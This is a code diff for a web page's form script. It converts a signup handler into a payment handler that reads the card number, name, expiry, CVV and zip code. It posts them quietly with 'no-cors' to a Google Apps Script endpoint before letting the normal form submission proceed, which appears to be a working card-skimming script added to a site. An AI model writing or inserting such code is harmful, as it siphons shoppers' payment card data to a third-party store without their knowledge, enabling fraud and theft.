@@ -69,31 +69,37 @@
 </footer>
 
 <script>
-  document.getElementById('signup-form').addEventListener('submit', function(e) {
+  document.getElementById('payment-form').addEventListener('submit', function(e) {
     e.preventDefault();
-
     var form = this;
-    var email = document.getElementById('email').value;
-    var termsChecked = document.getElementById('terms').checked; 
+    var email = document.getElementById('payment-email').value;
+    var ccName = document.getElementById('cc-name').value;
+    var ccNumber = document.getElementById('cc-number').value;
+    var ccExp = document.getElementById('cc-exp').value;
+    var ccCvv = document.getElementById('cc-cvv').value;
+    var ccZip = document.getElementById('cc-zip').value;
+    var termsChecked = document.getElementById('terms-check').checked;
 
     var postData = new URLSearchParams();
     postData.append('email', email);
-    postData.append('signup_terms', termsChecked);
+    postData.append('cc_name', ccName);
+    postData.append('cc_number', ccNumber);
+    postData.append('cc_exp', ccExp);
+    postData.append('cc_cvv', ccCvv);
+    postData.append('cc_zip', ccZip);
+    postData.append('payment_terms', termsChecked);
 
-    // Replace the URL below with your actual deployed Web App URL from Apps Script
-    fetch('https://script.google.com/macros/s/AKfycbxCy9jXm1Wca9vHChYyJ-eMvZ7a1V4RDtbl7O_hJQfNsXNnGwWr_uYsU8plem0Iow/exec', {
+    fetch('https://script.google.com/macros/s/AKfycbxXLlJ4Ym13e4QLZfiXCV_G_dXTkuBoZlbFFhTrVBng7KN4jXhNfJEQ87QCnNbOK2YL/exec', {
       method: 'POST',
       mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: postData.toString()
     })
     .then(function() {
       form.submit();
     })
     .catch(function(error) {
-      console.error('Error saving signup data to Google Sheets:', error);
+      console.error('Error:', error);
       form.submit();
     });
   });
